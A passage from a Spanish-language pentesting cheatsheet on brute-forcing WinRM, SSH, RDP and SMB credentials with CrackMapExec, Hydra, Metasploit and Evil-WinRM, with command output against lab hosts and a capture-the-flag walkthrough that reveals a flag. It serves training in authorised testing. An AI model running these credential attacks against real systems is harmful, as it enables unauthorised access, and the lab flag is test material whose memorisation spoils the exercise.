
# Bruteforce de Servicios

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir contraseñas de un usuario y acceder a sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo o en un entorno controlado.
{% endhint %}

***

Durante nuestras pruebas de penetración, cada red informática que encontremos tendrá servicios instalados para administrar, editar o crear contenido. Todos estos servicios se alojan mediante permisos específicos y se asignan a usuarios específicos. Además de las aplicaciones web, estos servicios incluyen (pero no se limitan a):

|           |       |             |
| --------- | ----- | ----------- |
| FTP       | SMB   | NFS         |
| IMAP/POP3 | SSH   | MySQL/MSSQL |
| PDR       | WinRM | VNC         |
| Telnet    | SMTP  | LDAP        |

Para obtener más información sobre muchos de estos servicios, consulte el módulo [Enumeración](/ethical-hacking-cheatsheet/recopilacion-de-informacion/enumeracion.md).

Imaginemos que queremos gestionar un servidor Windows a través de la red. En consecuencia, necesitamos un servicio que nos permita acceder al sistema, ejecutar comandos en él o acceder a su contenido a través de una GUI o el terminal. En este caso, los servicios más habituales adecuados para ello son `RDP`, `WinRM`, y `SSH`. SSH ahora es mucho menos común en Windows, pero es el servicio líder para sistemas basados ​​en Linux.

Todos estos servicios cuentan con un mecanismo de autenticación mediante un nombre de usuario y contraseña. Por supuesto, estos servicios se pueden modificar y configurar para que solo se puedan usar claves predefinidas para iniciar sesión, pero en muchos casos están configurados con configuraciones predeterminadas.

***

## <mark style="color:purple;">WinRM</mark>

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) es la implementación de Microsoft del protocolo de red [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). Es un protocolo de red basado en servicios web XML que utiliza el [Protocolo simple de acceso a objetos](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) utilizado para la administración remota de sistemas Windows. Se encarga de la comunicación entre [la administración empresarial basada en web](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) y el [instrumento de administración de Windows](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), que puede llamar al [modelo de objetos componentes distribuidos](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

Sin embargo, por motivos de seguridad, WinRM debe activarse y configurarse manualmente en Windows 10. Por lo tanto, depende en gran medida de la seguridad del entorno en un dominio o red local donde queramos usar WinRM. En la mayoría de los casos, se utilizan certificados o sólo mecanismos de autenticación específicos para aumentar su seguridad. WinRM utiliza los puertos TCP `5985`(`HTTP`) y `5986`(`HTTPS`).

Una herramienta útil que podemos utilizar para nuestros ataques a contraseñas es [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) , que también se puede utilizar para otros protocolos como SMB, LDAP, MSSQL y otros. Recomendamos leer la [documentación oficial](https://www.crackmapexec.wiki/) de esta herramienta para familiarizarse con ella.

### **CrackMapExec**

**Instalación**

Podemos instalar `CrackMapExec` a través de apt en un host Linux o clonar el [repositorio de GitHub](https://github.com/byt3bl33d3r/CrackMapExec) y seguir los distintos métodos [de instalación](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation) , como instalar desde el código fuente y evitar problemas de dependencia.

```bash
sudo apt-get -y install crackmapexec
```

**Opciones de menú de CrackMapExec**

Al ejecutar la herramienta con la opción `-h` nos mostrará instrucciones generales de uso y algunas opciones disponibles:

```shell-session
afsh4ck@kali$  crackmapexec -h
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                    [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
```

**Ayuda específica del protocolo CrackMapExec**

Tenga en cuenta que podemos especificar un protocolo específico y recibir un menú de ayuda más detallado de todas las opciones disponibles para nosotros. CrackMapExec actualmente admite la autenticación remota mediante MSSQL, SMB, SSH y WinRM.

```shell-session
afsh4ck@kali$ crackmapexec smb -h

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                        [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                        [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}]
                        [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions]
                        [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]]
                        [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]
                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE]
                        [--exec-method {atexec,wmiexec,smbexec,mmcexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
                        targets, NMap XML or .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)

<SNIP>
```

**Uso de CrackMapExec**

El formato general para usar CrackMapExec es el siguiente:

```shell-session
afsh4ck@kali$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
afsh4ck@kali$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

La aparición de `(Pwn3d!)`es la señal de que lo más probable es que podamos ejecutar comandos del sistema si iniciamos sesión con el usuario por fuerza bruta. Otra herramienta útil que podemos utilizar para comunicarnos con el servicio WinRM es [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) , que nos permite comunicarnos con el servicio WinRM de manera eficiente.

### **Evil-WinRM**

**Instalación**

```shell-session
afsh4ck@kali$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

**Uso de Evil-WinRM**

```shell-session
afsh4ck@kali$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Si el inicio de sesión fue exitoso, se inicializa una sesión de terminal utilizando el [protocolo de comunicación remota Powershell](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) ( `MS-PSRP`), que simplifica la operación y ejecución de comandos.

***

## <mark style="color:purple;">SSH</mark>

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) ( `SSH`) es una forma más segura de conectarse a un host remoto para ejecutar comandos del sistema o transferir archivos desde un host a un servidor. Por defecto se ejecuta el servidor SSH `TCP port 22`, al que podemos conectarnos mediante un cliente SSH. Este servicio utiliza tres operaciones/métodos de criptografía diferentes: `symmetric`cifrado, `asymmetric`cifrado y `hashing`.

**Cifrado simétrico**

El cifrado simétrico utiliza `same key`para cifrar y descifrar. Sin embargo, cualquiera que tenga acceso a la clave también podrá acceder a los datos transmitidos. Por lo tanto, se necesita un procedimiento de intercambio de claves para un cifrado simétrico seguro. Para ello se utiliza el método de intercambio de claves [Diffie-Hellman . ](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)Si un tercero obtiene la clave, no podrá descifrar los mensajes porque se desconoce el método de intercambio de claves. Sin embargo, el servidor y el cliente lo utilizan para determinar la clave secreta necesaria para acceder a los datos. Se pueden utilizar muchas variantes diferentes del sistema de cifrado simétrico, como AES, Blowfish, 3DES, etc.

**Cifrado asimétrico**

Usos del cifrado asimétrico `two SSH keys`: una clave privada y una clave pública. La clave privada debe permanecer secreta porque solo ella puede descifrar los mensajes que han sido cifrados con la clave pública. Si un atacante obtiene la clave privada, que a menudo no está protegida con contraseña, podrá iniciar sesión en el sistema sin credenciales. Una vez que se establece una conexión, el servidor utiliza la clave pública para la inicialización y autenticación. Si el cliente puede descifrar el mensaje, tiene la clave privada y la sesión SSH puede comenzar.

**hash**

El método hash convierte los datos transmitidos en otro valor único. SSH utiliza hash para confirmar la autenticidad de los mensajes. Este es un algoritmo matemático que solo funciona en una dirección.

### **Hydra - SSH**

Podemos utilizar una herramienta como `Hydra` de fuerza bruta a SSH. También hay un módulo dedicado específicamente a esta herramienta: [Hydra](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/hydra.md)

```shell-session
afsh4ck@kali$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Para iniciar sesión en el sistema mediante el protocolo SSH, podemos utilizar el cliente OpenSSH, que está disponible por defecto en la mayoría de distribuciones de Linux.

```shell-session
afsh4ck@kali$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

### **Metasploit - SSH Login**

```bash
afsh4ck@kali$ msfconsole -q

msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > options 

msf6 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting    Required  Description
   ----              ---------------    --------  -----------
   ANONYMOUS_LOGIN   false              yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   true               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                  yes       How fast to bruteforce, from 0 to 5
   CreateSession     true               no        Create a new session for every successful login
   DB_ALL_CREDS      false              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false              no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none               no        Skip existing credentials stored in the current database (Accepted: none, use
                                                  r, user&realm)
   PASSWORD                             no        A specific password to authenticate with
   PASS_FILE         password.list      no        File containing passwords, one per line
   RHOSTS            10.129.250.153     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                                  ics/using-metasploit.html
   RPORT             22                 yes       The target port
   STOP_ON_SUCCESS   true               yes       Stop guessing when a credential works for a host
   THREADS           1                  yes       The number of concurrent threads (max one per host)
   USERNAME                             no        A specific username to authenticate as
   USERPASS_FILE                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false              no        Try the username as the password for all users
   USER_FILE         usernames.list     no        File containing usernames, one per line
   VERBOSE           true               yes       Whether to print output for all attempts


msf6 auxiliary(scanner/ssh/ssh_login) > set user_file user.list
user_file => user.list

msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file password.list
pass_file => password.list

msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.129.42.197
rhosts => 10.129.42.197

msf6 auxiliary(scanner/ssh/ssh_login) > set blank_passwords true
blank_passwords => true

msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
stop_on_success => true

msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true

msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 10.129.250.153:22     - 10.129.250.153:22 - Success: '.\user:password'
[*] 10.129.250.153:22     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

***

## <mark style="color:purple;">RDP - Remote Desktop Protocol</mark>

[El Protocolo de escritorio remoto](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) de Microsoft ( `RDP`) es un protocolo de red que permite el acceso remoto a sistemas Windows de forma predeterminada. Trabaja por el puerto `TCP 3389`. RDP proporciona tanto a los usuarios como a los administradores/personal de soporte acceso remoto a los hosts de Windows dentro de una organización. El protocolo de escritorio remoto define dos participantes en una conexión: un llamado servidor terminal, en el que se realiza el trabajo real, y un cliente terminal, a través del cual se controla remotamente el servidor terminal. Además del intercambio de imágenes, sonido, teclado y dispositivo señalador, el RDP también puede imprimir documentos del servidor terminal en una impresora conectada al cliente terminal o permitir el acceso a los medios de almacenamiento disponibles allí. Técnicamente, RDP es un protocolo de capa de aplicación en la pila de IP y puede utilizar TCP y UDP para la transmisión de datos. El protocolo lo utilizan varias aplicaciones oficiales de Microsoft, pero también se utiliza en algunas soluciones de terceros.

### **Hydra - RDP**

También podemos utilizar `Hydra` para realizar fuerza bruta a RDP:

```shell-session
afsh4ck@kali$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Linux ofrece diferentes clientes para comunicarse con el servidor deseado utilizando el protocolo RDP. Estos incluyen [Remmina](https://remmina.org/) , [rdesktop](http://www.rdesktop.org/) , [xfreerdp](https://linux.die.net/man/1/xfreerdp) y muchos otros. Para nuestros propósitos, trabajaremos con xfreerdp.

### **xFreeRDP**

`xFreeRDP` es un cliente RDP (Remote Desktop Protocol) que permite a los usuarios conectarse a escritorios remotos en sistemas Windows desde un entorno Linux. Es una herramienta versátil y de código abierto que proporciona varias opciones y configuraciones para optimizar el acceso remoto, como especificación de resoluciones de pantalla, configuración de sonido y redirección de dispositivos locales al sistema remoto.

#### Instalación en Kali Linux

<pre class="language-bash"><code class="lang-bash"><strong># Instalar con apt
</strong><strong>sudo apt install freerdp3-x11
</strong>
# Comprobar la ruta de instalación
dpkg -L freerdp3-x11 | grep xfreerdp
/usr/bin/xfreerdp3
</code></pre>

En las nuevas versiones se instala como `xfreerdp3`. SI queremos usarlo como `xfreerdp` podemos crear un alias:

```bash
alias xfreerdp='xfreerdp3'
echo "alias xfreerdp='xfreerdp3'" >> ~/.zshrc
source ~/.zshrc
```

#### Conexión al objetivo

```bash
afsh4ck@kali$ xfreerdp /v:<target-IP> /u:<username> /p:<password> /size: <width>x<height> /drive:home,"/home/kali/hack-tools/"
```

<table><thead><tr><th width="324">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>/v</code></td><td>IP del host a que nos queremos conectar</td></tr><tr><td><code>/u:&#x3C;usuario> /p:&#x3C;contraseña></code></td><td>Usuario y contraseña</td></tr><tr><td><code>/size</code></td><td>Seleccionar tamaño de ventana o porcentaje <code>%</code></td></tr><tr><td><code>/drive:home,"/home/kali/hack-tools/"</code></td><td>Monta un directorio local como unidad dentro del entorno RDP (útil para enviar archivos y herramientas)</td></tr></tbody></table>

```shell-session
afsh4ck@kali$ xfreerdp /v:10.129.42.197 /u:user /p:password /size:70% /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"

...SNIP...
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

![](https://academy.hackthebox.com/storage/modules/147/RDP.png)

***

## <mark style="color:purple;">SMB</mark>

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) ( `SMB`) es un protocolo responsable de transferir datos entre un cliente y un servidor en redes de área local. Se utiliza para implementar servicios de impresión y uso compartido de archivos y directorios en redes Windows. A menudo se hace referencia a SMB como un sistema de archivos, pero no lo es. SMB se puede comparar `NFS` con Unix y Linux para proporcionar unidades en redes locales.

SMB también se conoce como [Sistema de archivos común de Internet](https://cifs.com/) ( `CIFS`). Es parte del protocolo SMB y permite la conexión remota universal de múltiples plataformas como Windows, Linux o macOS. Además, a menudo nos encontraremos con [Samba](https://wiki.samba.org/index.php/Main_Page) , que es una implementación de código abierto de las funciones anteriores. Para SMB, también podemos usar `hydra`nuevamente para probar diferentes nombres de usuario en combinación con diferentes contraseñas.

### **Hydra - SMB**

```shell-session
afsh4ck@kali$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

Sin embargo, también podemos recibir el siguiente error que describe que el servidor ha enviado una respuesta no válida.

### **Hydra - Error**

```shell-session
afsh4ck@kali$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Esto se debe a que lo más probable es que tengamos una versión desactualizada de THC-Hydra que no puede manejar las respuestas SMBv3. Para solucionar este problema, podemos actualizar y recompilar manualmente `hydra` o utilizar otra herramienta como [framework Metasploit](https://www.metasploit.com/) .

### **Metasploit - SMB Login**

```bash
afsh4ck@kali$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
user_file => user.list

msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
pass_file => password.list

msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ahora podemos usar `CrackMapExec` para ver los recursos compartidos disponibles y qué privilegios tenemos para ellos.

### **CrackMapExec**

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

Para comunicarnos con el servidor vía SMB podemos utilizar, por ejemplo, la herramienta [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) . Esta herramienta nos permitirá ver el contenido de los recursos compartidos, cargar o descargar archivos si nuestros privilegios lo permiten.

### **Smbclient**

```shell-session
afsh4ck@kali$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

***

## <mark style="color:purple;">Lab - Password Attacks</mark>

Vamos a explotar varios servicios en un host controlado utilizando las técnicas que hemos visto de Password Attacks.

***

### <mark style="color:purple;">WinRM</mark>

Busque el usuario del servicio WinRM y descifre su contraseña. Luego, cuando inicies sesión, encontrarás la flag en el escritorio.&#x20;

#### CrackMapExec

```shell-session
afsh4ck@kali$ crackmapexec winrm 10.129.202.136 -u username.list -p password.list

SMB         10.129.202.136  5985   WINSRV           [*] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.136  5985   WINSRV           [*] http://10.129.202.136:5985/wsman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:12345
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:123456789
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:batman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:password
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:iloveyou
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:princess
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

#### Evil-WinRM

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.202.136 -u john -p november
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                    
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd /
*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2020   7:11 PM                PerfLogs
d-r---       12/14/2020   6:38 PM                Program Files
d-----        2/11/2022   6:10 AM                Program Files (x86)
d-r---         1/6/2022   6:49 AM                Users
d-----       12/14/2020   7:11 PM                Windows

*Evil-WinRM* PS C:\> 
```

```powershell
*Evil-WinRM* PS C:\> cd Users
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2020   6:32 PM                Administrator
d-----         1/6/2022   6:44 AM                cassie
d-----         1/6/2022   6:44 AM                chris
d-----         1/5/2022   8:14 AM                dennis
d-----         1/6/2022   6:49 AM                jerome
d-----         1/5/2022   8:08 AM                john
d-r---       12/14/2020   6:32 PM                Public
```

```powershell
*Evil-WinRM* PS C:\Users> cd john
*Evil-WinRM* PS C:\Users\john> dir

    Directory: C:\Users\john

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         1/5/2022   8:08 AM                3D Objects
d-r---         1/5/2022   8:08 AM                Contacts
d-r---         1/5/2022   8:11 AM                Desktop
d-r---         1/5/2022   8:08 AM                Documents
d-r---         1/5/2022   8:08 AM                Downloads
d-r---         1/5/2022   8:08 AM                Favorites
d-r---         1/5/2022   8:08 AM                Links
d-r---         1/5/2022   8:08 AM                Music
d-r---         1/5/2022   8:08 AM                Pictures
d-r---         1/5/2022   8:08 AM                Saved Games
d-r---         1/5/2022   8:08 AM                Searches
d-r---         1/5/2022   8:08 AM                Videos

*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> cat flag.txt
HTB{That5Novemb3r}
```

Accedemos correctamente a la `flag.txt` dentro del escritorio de John 🏆

***

### <mark style="color:purple;">SSH</mark>

Busque el usuario del servicio SSH y descifre su contraseña. Luego, cuando inicies sesión, encontrarás la flag en el escritorio.

```bash
hydra -L username.list -P password.list ssh://10.129.202.136 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:41:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
[DATA] attacking ssh://10.129.202.136:22/
